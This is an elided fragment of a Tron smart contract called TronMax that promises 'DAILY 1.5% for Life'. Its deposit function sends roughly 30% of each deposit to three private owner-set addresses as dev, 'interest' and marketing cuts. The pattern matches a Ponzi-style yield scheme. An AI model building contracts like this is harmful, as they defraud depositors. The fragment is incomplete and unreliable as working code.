...
contract TronMax {
    ...
    uint private devCommission = 2;
    uint private interestRate = 24;
    uint private marketingBud = 4;
    uint public commissionDivisor = 100;
    uint private minuteRate = 173610; //DAILY 1.5% for Life
    uint public releaseTime = 1594620000;

    address private contractInit;
    address private inTerestR;
    address private marketBud;
    ...
    constructor(address _owner, address _interest, address _marketingB) public {
        owner = _owner;
        inTerestR = _interest;
        marketBud = _marketingB;
        contractInit = msg.sender;
    }
    ...
    function deposit(address _affAddr) public payable {
        ...
        contractInit.transfer(devEarn);
        uint inTerestF = depositAmount.mul(interestRate).div(commissionDivisor);
        inTerestR.transfer(inTerestF);
        uint marketIn = depositAmount.mul(marketingBud).div(commissionDivisor);
        marketBud.transfer(marketIn);
    }
